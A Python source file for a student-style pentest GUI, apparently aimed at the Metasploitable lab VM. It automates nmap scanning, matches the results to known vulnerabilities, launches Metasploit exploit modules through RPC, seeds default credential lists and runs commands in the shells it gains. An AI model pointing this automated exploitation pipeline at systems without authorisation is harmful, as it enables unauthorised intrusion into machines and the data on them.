# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

import time
import sys
import os
sys.path.append(os.getcwd() + "/lib/")
from lib.msfrpc4 import *
import nmap_dest
import re
import copy
import subprocess
import utils
from colorama import Fore
import scanNetwork
from knownVulnerabilities import vulnerabilities
import tkinter as tk
from tkinter import messagebox, simpledialog, ttk


###################################### GUI Variables ######################################
initial_setup_done = False # For button disable
server_setup_done = False # For button disable
TEST_MODE = False # For test mode to be called
RHOSTS = [] # Holds our target IP addresses
client = None # Holds our metasploit client


###################################### OG Variables ######################################
CHECK_MODE = False # will check for exploits rather than running them when can
RUN_NMAP = False # set this to false when you want to test on metasploit machine and assume all exploits will run
NMAP_AGGRESSIVENESS = 2 # aggressiveness of nmap scan
# in order of increasing levels of fucking around (and also in increasing levels of finding out)
NMAP_POSSIBLE_ARGS = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
EXPLOIT_NUM = 4 # for testingsd
#TEST_MODE = True
EXPLOIT_NUM = min(EXPLOIT_NUM, len(vulnerabilities) - 1)
#RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through command line argument
if len(sys.argv) > 1:
    RHOSTS = list(sys.argv[1])
startTime = time.time()



###################################### GUI Functions ######################################

# TODO: @TREVOR make this so that subprocess is killed after a certain amount of time 
def run_setup_script(): # The intial setup script that runs the initial_setup.sh file
    global initial_setup_done, setup_button
    if not initial_setup_done:
        proc1 = subprocess.Popen(["./initial_setup.sh"], shell=True)
        initial_setup_done = True
        setup_button.config(state="disabled")
        
        # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Initial Setup in Progress")
        message = tk.Label(popup, text="Initial setup started, please wait up to 3 minutes. \nThis window will close automatically once it's done! \n\nNote: you will need to input your password in terminal to properly run the sudo commands.\n\n Note: If it says you have the requirements already then feel free to close this window and move on.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
        _ = proc1.wait()
        popup.after(1, close_popup)
        proc1.kill()
        print("Initial setup finished")
        


def run_server_script(): # Sets up msfconsole RPC server
    global server_setup_done, server_button
    if not server_setup_done:
        print("Starting server setup")
        proc1 = subprocess.Popen(["./setup.sh"], shell=True)
        server_setup_done = True
        server_button.config(state="disabled")
       
       # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Server Setup in Progress")
        message = tk.Label(popup, text="Server setup started, please wait up to 40 seconds. \nThis window will close automatically once it's done! \n\nNote: You only need to run this if you restarted your computer since the last time you ran this setup.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
            tk.messagebox.showinfo("Server Setup Script", "Server setup completed, Go have fun.")

        _ = proc1.wait()
        popup.after(1, close_popup)
        proc1.kill()
        print("Server setup finished")


def retrieve_aggressiveness_input(): # Gets nmap aggressiveness from GUI
    global NMAP_AGGRESSIVENESS
    # Get the input from the entry widget
    input_value = entry.get()
    try:
        # Convert to integer and validate range
        NMAP_AGGRESSIVENESS = int(input_value)
        if 0 <= NMAP_AGGRESSIVENESS <= 3:
            # Call your Nmap scan function here with aggressiveness
            print(f"Using aggressiveness {NMAP_AGGRESSIVENESS} for Nmap scan.")
        else:
            print("Please enter a valid number between 0 and 3. Higher number = slower, more comprehensive, more detectable.")
    except ValueError:
        print("Please enter a valid integer.")


def initiate_nmap_scan(): # Runs the Nmap scan
    global NMAP_AGGRESSIVENESS
    # Assuming aggressiveness is obtained from the GUI
    input_value = entry.get()
    if input_value.isdigit():  # Check if the input is a digit
        NMAP_AGGRESSIVENESS = int(input_value)
        if 0 <= NMAP_AGGRESSIVENESS <= 3:
            nmap_dest.run_scan(NMAP_AGGRESSIVENESS)
            print(f"Running Nmap scan with aggressiveness {NMAP_AGGRESSIVENESS}")
        else:
            tk.messagebox.showwarning("Warning", "Please enter a valid number between 0 and 3.")
    else:
        tk.messagebox.showwarning("Warning", "Please enter a valid integer for Nmap scan aggressiveness.")


def update_rhosts_combobox(new_items): # Updates the RHOSTS combobox with new items
    rhosts_combobox['values'] = new_items
    if new_items:
        rhosts_combobox.current(0)  # Optionally, set the first item as the default selection


def on_rhosts_select(event): # Updates the RHOSTS variable when a new item is selected
    global RHOSTS
    selected_value = rhosts_combobox.get()
    if selected_value and selected_value != "Select RHOST":
        RHOSTS = [selected_value]
        print(f"RHOSTS set to: {RHOSTS}")  # For debugging


def start_metasploit_clean(): # Starts metasploit and kills all previous sessions
    global client # We need to make client global so we can use it in other functions 
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("Sessions list (should be empty):", client.sessions.list)
    for k in client.jobs.list.keys():
        client.jobs.stop(str(k))
    print("Jobs list (should be empty)", client.jobs.list)
    for console in client.consoles.list:
        k = console["id"]
        client.consoles.console(str(k)).destroy()
    print("Consoles (should be empty):", client.consoles.list)
    print()


def toggle_test_mode():
    global TEST_MODE
    if test_mode_var.get() == 1:
        TEST_MODE = True
        print("Test Mode is ON")
        # Additional actions when Test Mode is enabled
    else:
        TEST_MODE = False
        print("Test Mode is OFF")
        # Additional actions when Test Mode is disabled


def add_to_rhosts():
    global RHOSTS
    new_ip = new_ip_entry.get()
    if new_ip:  # Check if the new IP field is not empty
        RHOSTS.append(new_ip)
        if RHOSTS:
            update_rhosts_combobox(RHOSTS)  # Update dropdown values
        else:
            update_rhosts_combobox(["Select RHOST"])  # Update dropdown values
        new_ip_entry.delete(0, tk.END)  # Clear the input field
        rhosts_combobox.current(len(RHOSTS) - 1)  # Select the newly added IP
        on_rhosts_select(None)  # Trigger the selection event manually

# Function to display Nmap output in a new window
# TODO: Fight with it to actually show the colored output
def display_colored_nmap_output(colored_output):
    # Create a new Toplevel window
    popup = tk.Toplevel(root)
    popup.title("Nmap Output")

    # Create a Text widget for displaying the output
    text_widget = tk.Text(popup, wrap='word', bg='black', fg='white')
    text_widget.pack(expand=True, fill='both')

    # Insert colored output into the Text widget
    for line in colored_output:
        text_widget.insert('end', line + "\n")

    # Disable editing of the Text widget
    text_widget.config(state='disabled')

    # Add a Scrollbar widget
    scrollbar = tk.Scrollbar(popup, command=text_widget.yview)
    scrollbar.pack(side='right', fill='y')
    text_widget['yscrollcommand'] = scrollbar.set

###################################### Functions from Main ######################################

# Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
    consoles = []
    savedOutputInfo = dict()

    global client
    if client is None: #If there is no client, then we can't run exploits
        print("Metasploit client is not initialized.")
        return

    # load the list of default passwords and usernames and overwrite the existing files so we can add more terms later
    usernames = utils.default_usernames
    passwords = utils.default_passwords
    userFile = open("USERNAMES.txt", "w")
    for username in usernames:
        userFile.write(username + "\n")
    userFile.close()
    usernames = []
    passFile = open("PASSWORDS.txt", "w")
    for password in passwords:
        passFile.write(password + "\n")
    passFile.close()
    passwords = []

    for (i, vulnerability) in enumerate(vulnerabilitiesToUse):
        # once one session is created, don't perform any of the other exploits
        if vulnerability.exploitType == "exploit" and len(client.sessions.list) > 0:
            print("Skipping vulnerability as RCE session has already been created")
            continue
        module = vulnerability.module
        exploit = client.modules.use(vulnerability.exploitType, module)
        # options = exploit.options
        exploit.missing_required
        if 'RHOSTS' in exploit.missing_required:
            exploit['RHOSTS'] = RHOSTS[0] # TODO: change this to loop through
        if exploit.missing_required:
            print("missing options:", exploit.missing_required)
        
        if vulnerability.options:
            print("Settings:")
            for option, value in vulnerability.options.items():
                print(option + ":", value)
                exploit[option] = value

        if CHECK_MODE & vulnerability.canCheck: # CHECK THE EXPLOIT's FEASIBILITY
            print("#" * 34, "ONLY CHECKING EXPLOITABILITY", "#" * 34)
            print("VULNERABILITY MODULE:", vulnerability.module)
            if vulnerability.payload:
                print("PAYLOAD:", vulnerability.payload)
                payload_ = client.modules.use('payload', vulnerability.payload)
                print("!!  CHECK STATUS  !!:", exploit.check_redo(payload=payload_))
                print("!! CHECK STATUS 2 !!:", exploit.check_redo(payload=vulnerability.payload))
            else:
                print("!! CHECK STATUS !!:", exploit.check_redo())
            exploit.check_redo()
        else: ### EXPLOIT THE MODULE
            print("#" * 34, "RUNNING", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)
            # print("EXPLOIT INFO:\n" + exploit._info) # uncomment this for A LOT of info
            print("VULNERABILITY MODULE:", vulnerability.module)
            console = client.consoles.console()
            consoles.append((console, vulnerability.description))
            if vulnerability.payload:
                print("PAYLOAD:", vulnerability.payload)
                print("PAYLOAD IS VALID:", vulnerability.payload in exploit.targetpayloads())
                payload_ = client.modules.use('payload', vulnerability.payload)
                if payload_.missing_required:
                    print("PAYLOAD MISSING OPTIONS:", payload_.missing_required)
                output = console.run_module_with_output(exploit, payload=payload_)
                # exploit.execute(payload=vulnerability.payload)
                # exploit.execute(payload=payload_)
                # output = ""
            else:
                output = console.run_module_with_output(exploit)
            print("XXXXXXXXX\n\n\n", output)
            # print("\nOUTPUT:\n" + output) # uncomment this for debugging output
            resultExtracted = utils.getSuccessMessage(output)
            print("OUTPUT extracted:")
            print(resultExtracted)
            if vulnerability.outputPatternMatch:
                savedOutputInfo[i] = []
                for line in resultExtracted.splitlines():
                    matchedText = re.search(vulnerability.outputPatternMatch, line)
                    if matchedText:
                        savedOutputInfo[i].append(matchedText[0])
            if vulnerability.addUserNames:
                for line in savedOutputInfo[i]:
                    idx = savedOutputInfo[i].find(":")
                    if idx >= 0:
                        names = savedOutputInfo[i][i+1:].strip().split(",")
                        usernames += names
                userFile = open("USERNAMES.txt", "w")
                for username in usernames:
                    userFile.write(username + "\n")
                userFile.close()
            print("#" * 34, "FINISHED", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)

    print("ALL EXPLOITS SETUP AND RUNNING")
    while(client.jobs.list):
        print("SESSION LIST [" + str(len(client.sessions.list)) + "]:", client.sessions.list)
        print("JOB LIST [" + str(len(client.jobs.list)) + "]:", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
        time.sleep(10)
    print("SESSION LIST:", client.sessions.list)
    return savedOutputInfo


def install_metasploit_framework(): # Runs a command in the utils.py file
    print(utils.runThisCommand("sudo systemctl enable snapd.service"))
    print(utils.runThisCommand("sudo systemctl start snapd.service"))
    time.sleep(5)

    print("SNAP INSTALLING METASPLOIT-FRAMEWORK") 
    p = subprocess.Popen(["sudo snap install metasploit-framework"], stdout=subprocess.PIPE, shell=True)
    # (output, err) = p.communicate()
    _ = p.wait()
    print("DONE INSTALLING METASPLOIT-FRAMEWORK") 
    time.sleep(2)


def test_mode(): # Runs the test mode
    global TEST_MODE
    if TEST_MODE:
        # Create a popup window for test mode
        test_popup = tk.Toplevel(root)
        test_popup.title("Test Mode")

        # Label for dropdown
        test_label = tk.Label(test_popup, text="Select a Vulnerability to Test:")
        test_label.pack(pady=(10, 0))

        # Dropdown for vulnerabilities
        vulnerability_options = [vuln.description for vuln in vulnerabilities]  # Assuming vulnerabilities is a list of objects
        vulnerability_dropdown = ttk.Combobox(test_popup, values=vulnerability_options)
        vulnerability_dropdown.pack(pady=5)

        # Labels for vulnerability details (initially empty)
        name_label = tk.Label(test_popup, text="Name: ")
        name_label.pack(pady=(5, 0))
        type_label = tk.Label(test_popup, text="Type: ")
        type_label.pack(pady=(5, 0))
        desc_label = tk.Label(test_popup, text="Description: ")
        desc_label.pack(pady=(5, 0))

        # Function to update labels with details of the selected vulnerability
        def update_vulnerability_details(event):
            # Find the selected vulnerability object
            selected_vuln = next((vuln for vuln in vulnerabilities if vuln.description == vulnerability_dropdown.get()), None)
            if selected_vuln:
                name_label.config(text=f"Name: {selected_vuln.module}")
                type_label.config(text=f"Type: {selected_vuln.exploitType}")
                desc_label.config(text=f"Description: {selected_vuln.description}")

        # Bind the update function to the dropdown selection event
        vulnerability_dropdown.bind("<<ComboboxSelected>>", update_vulnerability_details)


        # Function to run when Submit is clicked
        def on_submit():
            global client
            selected_vulnerability = vulnerability_dropdown.get()
            
            if client is None:
                start_metasploit_clean()  # Initialize the Metasploit client if not already done
            
            if selected_vulnerability in vulnerability_options:
                vulnerability_index = vulnerability_options.index(selected_vulnerability)
                runExploits([vulnerabilities[vulnerability_index]])
            else:
                messagebox.showerror("Error", "Please select a valid vulnerability or enter a number.")
            
            test_popup.destroy()

        # Submit button for the popup
        submit_button = tk.Button(test_popup, text="Submit", command=on_submit)
        submit_button.pack(pady=(5, 10))

    else:
        messagebox.showinfo("Test Mode", "TEST_MODE is Off, please set it to True to run exploits")

# color keywords in the nmap output
def colorNmapOutput(nmapOutput):
    print("COLORING NMAP")
    allKeywords = []
    for vulnerability in vulnerabilities:
        kws = vulnerability.keywords + vulnerability.optionalKeywords
        allKeywords.append([kws, vulnerability.color])
    nmapOutputCopy = copy.deepcopy(nmapOutput)
    coloredNmapOutput = []
    for line in nmapOutputCopy:
        coloredLine = line
        for [wordSet, color] in allKeywords:
            for word in wordSet:
                coloredLine = coloredLine.replace(word, color + word + Fore.RESET)
        coloredNmapOutput.append(coloredLine)
    return coloredNmapOutput

# To check if a string is a valid IP address dor RHOSTS
def is_valid_ip(ip):
    """Check if a string is a valid IP address."""
    pattern = r'^\d{1,3}(\.\d{1,3}){3}$'
    return re.match(pattern, ip) is not None

# TODO: @ chris make error messages pop up when trying to run this if run without
# RHOSTS having any IP's
def full_exploitation_cycle():
    global NMAP_AGGRESSIVENESS, RHOSTS, RUN_NMAP, client
    
    nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]

    # Check if the client is initialized
    if client is None:
        messagebox.showerror("Error", "Metasploit client is not initialized. Please start Metasploit first.")
        return

    # Filter out invalid IP addresses from RHOSTS
    RHOSTS = [ip for ip in RHOSTS if is_valid_ip(ip)]
    if not RHOSTS:
        messagebox.showerror("Error", "No valid IP addresses found in RHOSTS.")
        return


    for RHOST in RHOSTS:
        print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
        # Decides if we want to run nmap or just assumes all outputs work
        nmapOutput = nmap_dest._nmap_sample_ouput
        if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
            ######## RECONAISSANCE PHASE ########
            nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
            # print(nmapOutput)
            if (nmapOutput[1][0:22] == "Note: Host seems down."):
                print("Host seems down. Exiting.")
                exit()

        ######## WEAPONIZATION PHASE ########
        vulnerabilitiesToUse = set()
        vulnInfos = []
        for i in range(len(vulnerabilities)):
            vulnInfos.append(dict())
            vulnInfos[i]["keywords"] = set()
            vulnInfos[i]["optionalKeywords"] = set()
        # Scan nmap output for key terms
        for line in nmapOutput:
            # Detect what keywords each line of the nmap output contains and compare those to the descriptions
            # for each known vulnerability and add matched key terms to vulnInfosDict
            for (i, vulnerability) in enumerate(vulnerabilities):
                flag = re.IGNORECASE
                if vulnerability.caseSensitiveKeyTermMatch:
                    flag = 0
                for keyword in vulnerability.keywords:
                    if re.search(keyword, line, flag):
                        vulnInfos[i]["keywords"].add(keyword)
                for optionalKeyword in vulnerability.optionalKeywords:
                    if re.search(optionalKeyword, line, flag):
                        vulnInfos[i]["optionalKeywords"].add(optionalKeyword)

            # Determine which vulns to use based off NMAP scan
            # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
            for (i, vulnInfo) in enumerate(vulnInfos):
                if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
                    print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
                    vulnerabilitiesToUse.add(vulnerabilities[i])
        else:
            # here we don't run nmap and just assume that all vulnerabilities work
            print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
            vulnerabilitiesToUse = vulnerabilities
        
        # replace keywords in nmap scan with colored keywords
        coloredNmapOutput = colorNmapOutput(nmapOutput)
        # TODO: @chris make a separate window or figure out somewhere for 
        # coloredNmapOutput to be displayed in for the user to see
        for line in coloredNmapOutput:
            print(line)

        display_colored_nmap_output(coloredNmapOutput) # Display colored Nmap output in a new window
        
        ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
        # Open the error log file
        with open('error_log.txt', 'a') as f:
            # Redirect standard error to the file
            sys.stderr = f
            
            # Capture errors from runExploits
            try:
                savedOutputInfo = runExploits(vulnerabilitiesToUse)
            except Exception as e:
                # This will write to your log file instead of the console
                print(f"An error occurred: {e}", file=sys.stderr)


    ####### Print some info on the sessions created
    print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
    sessions = client.sessions.list
    numSessions = 0
    for k in client.sessions.list.keys():
        numSessions += 1
    print("Number of sessions created:", numSessions)

    print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
    for k in client.sessions.list.keys():
        shell = client.sessions.session(str(k))
        shell.write('whoami')
        shell.write('pwd')
        print(shell.read())

    # print out saved info from running exploits
    print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
    for v in savedOutputInfo.keys():
        print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
        for line in savedOutputInfo[v]:
            print(line)

###################################### The GUI ######################################

# Create the GUI
root = tk.Tk()
root.title("Bootcon Pentesting Tool GUI v0.2")

# Main frame to contain grid
left_frame = tk.Frame(root)
left_frame.grid(row=0, column=0, padx=10)

right_frame = tk.Frame(root)
right_frame.grid(row=0, column=1, padx=10)

########## The Widgets ##########

########## The Widgets for Left Frame ##########

# Button to run initial setup script
setup_button = tk.Button(left_frame, text="Run Initial Setup", command=run_setup_script)
setup_button.grid(row=0, column=0, padx=5)

# Button to run server script
server_button = tk.Button(left_frame, text="Run Server Setup", command=run_server_script)
server_button.grid(row=1, column=0, padx=5)

# Button to run utils function
utils_button = tk.Button(left_frame, text="Install metasploit-framework", command=install_metasploit_framework)
utils_button.grid(row=2, column=0, padx=5)

# Label for Nmap scan aggressiveness
label_text = "Enter the aggressiveness of the nmap scan\n(least aggressive 0 - 3 most aggressive):"
label = tk.Label(left_frame, text=label_text, justify=tk.LEFT)
label.grid(row=3, column=0, padx=5)

# Entry for Nmap scan aggressiveness
entry = tk.Entry(left_frame)
entry.grid(row=4, column=0, padx=5)

# Submit button for Nmap scan aggressiveness
button = tk.Button(left_frame, text="Submit", command=retrieve_aggressiveness_input)
button.grid(row=5, column=0, padx=5)

# Start Nmap scan button
nmap_button = tk.Button(left_frame, text="Start Nmap Scan", command=initiate_nmap_scan)
nmap_button.grid(row=6, column=0, padx=5)


########## The Widgets for Right Frame ##########

# Checkbox for test mode
test_mode_var = tk.IntVar() # Create a variable to store the state of the test mode checkbox
test_mode_checkbox = tk.Checkbutton(right_frame, text="Enable Test Mode", variable=test_mode_var, command=toggle_test_mode)
test_mode_checkbox.grid(row=0, column=0, padx=5)

# Button for test mode
test_mode_button = tk.Button(right_frame, text="Test Mode", command=test_mode)
test_mode_button.grid(row=1, column=0, padx=5)

# New IP Entry Field
new_ip_label = tk.Label(right_frame, text="Enter new RHOST IP:")
new_ip_label.grid(row=2, column=0)

new_ip_entry = tk.Entry(right_frame)
new_ip_entry.grid(row=3, column=0)

# Button to Add New IP to RHOSTS
add_ip_button = tk.Button(right_frame, text="Add IP to RHOSTS", command=add_to_rhosts)
add_ip_button.grid(row=4, column=0, padx=5)

# RHost dropdown menu
rhosts_combobox = ttk.Combobox(right_frame)
rhosts_combobox['values'] = ["Select RHOST"]  # Placeholder values
rhosts_combobox.current(0)  # Set the combobox to show the first item
rhosts_combobox.grid(row=5, column=0)
rhosts_combobox.bind("<<ComboboxSelected>>", on_rhosts_select)

# Button to start metasploit
metasploit_button = tk.Button(right_frame, text="Start Metasploit", command=start_metasploit_clean)
metasploit_button.grid(row=7, column=0, padx=5)

# Button to run big boi function
full_exploit_button = tk.Button(right_frame, text="Run full_exploitation_cycle", command=full_exploitation_cycle)
full_exploit_button.grid(row=8, column=0, padx=5)



if __name__ == "__main__":
    root.mainloop()
    pass
    #############################################################################
    # RUN ./setup.sh TO SET EVERYTHING UP.  This is for automating the exploit only
    # proc1 = subprocess.Popen(["yes | ./setup.sh"])
    # print("FINISHED SETTING UP SERVER")
    # time.sleep(180)
    # proc1.kill()

    ## utils.runThisCommand("sudo snap install metasploit-framework")
    #print(utils.runThisCommand("whoami"))
    #print(utils.runThisCommand("sudo systemctl enable snapd.service"))
    #print(utils.runThisCommand("sudo systemctl start snapd.service"))
    #time.sleep(5)
    #
    #print("SNAP INSTALLING METASPLOIT-FRAMEWORK") 
    #p = subprocess.Popen(["sudo snap install metasploit-framework"], stdout=subprocess.PIPE, shell=True)
    #(output, err) = p.communicate() 
    #p_status = p.wait()
    #print("DONE INSTALLING METASPLOIT-FRAMEWORK") 
    #time.sleep(10)

    # this needs to be run janky like this cuz the command sometimes just hangs 
    # and doesnt run to completion but its ok cuz it runs the shit we need it to run
    #proc1 = subprocess.Popen(["./setup.sh"])
    #time.sleep(180)
    #proc1.kill()
    #exit()

    # basically starts metasploit and kill all previous sessions 
    #client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    #for k in client.sessions.list.keys():
    #    client.sessions.session(str(k)).stop()
    #print("Sessions list (should be empty):", client.sessions.list)
    #for k in client.jobs.list.keys():
    #    client.jobs.stop(str(k))
    #print("Jobs list (should be empty)", client.jobs.list)
    #for console in client.consoles.list:
    #    k = console["id"]
    #    client.consoles.console(str(k)).destroy()
    #print("Consoles (should be empty):", client.consoles.list)
    #print()

    # output = self.client.consoles.console(console_id).run_module_with_output(exploit)                
    # dict_module['results'] = self.extractResult(output)
    # resultModules.append(dict_module)

    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    #if TEST_MODE:
    #    savedOutputInfo = runExploits()
    #    exit()
    ##############################################################################################

    #nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
    #for RHOST in RHOSTS:
    #    print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
    #    # Decides if we want to run nmap or just assumes all outputs work
    #    if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
    #        ######## RECONAISSANCE PHASE ########
    #        nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
    #        print(nmapOutput)
    #        if (nmapOutput[1][0:22] == "Note: Host seems down."):
    #            print("Host seems down. Exiting.")
    #            exit()
    #
    #        ######## WEAPONIZATION PHASE ########
    #        vulnerabilitiesToUse = set()
    #        vulnInfos = []
    #        for i in range(len(vulnerabilities)):
    #            vulnInfos.append(dict())
    #            vulnInfos[i]["keywords"] = set()
    #            vulnInfos[i]["optionalKeywords"] = set()
    #        # Scan nmap output for key terms
    #        for line in nmapOutput:
    #            # Detect what keywords each line of the nmap output contains and compare those to the descriptions
    #            # for each known vulnerability and add matched key terms to vulnInfosDict
    #            for (i, vulnerability) in enumerate(vulnerabilities):
    #                flag = re.IGNORECASE
    #                if vulnerability.caseSensitiveKeyTermMatch:
    #                    flag = 0
    #                for keyword in vulnerability.keywords:
    #                    if re.search(keyword, line, flag):
    #                        vulnInfos[i]["keywords"].add(keyword)
    #                for optionalKeyword in vulnerability.optionalKeywords:
    #                    if re.search(optionalKeyword, line, flag):
    #                        vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
    #        
    #        # Determine which vulns to use based off NMAP scan
    #        # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
    #        for (i, vulnInfo) in enumerate(vulnInfos):
    #            if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
    #                print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
    #                vulnerabilitiesToUse.add(vulnerabilities[i])
    #    else:
    #        # here we don't run nmap and just assume that all vulnerabilities work
    #        print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
    #        vulnerabilitiesToUse = vulnerabilities
    #    
    #    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    #    savedOutputInfo = runExploits(vulnerabilitiesToUse)
    #
    #    ####### Print some info on the sessions created
    #    print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
    #    sessions = client.sessions.list
    #    numSessions = 0
    #    for k in client.sessions.list.keys():
    #        numSessions += 1
    #    print("Number of sessions created:", numSessions)
    #
    #    print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
    #    for k in client.sessions.list.keys():
    #        shell = client.sessions.session(str(k))
    #        shell.write('whoami')
    #        shell.write('pwd')
    #        print(shell.read())
    #
    #    # print out saved info from running exploits
    #    print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
    #    for v in savedOutputInfo.keys():
    #        print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
    #        for line in savedOutputInfo[v]:
    #            print(line)
    #   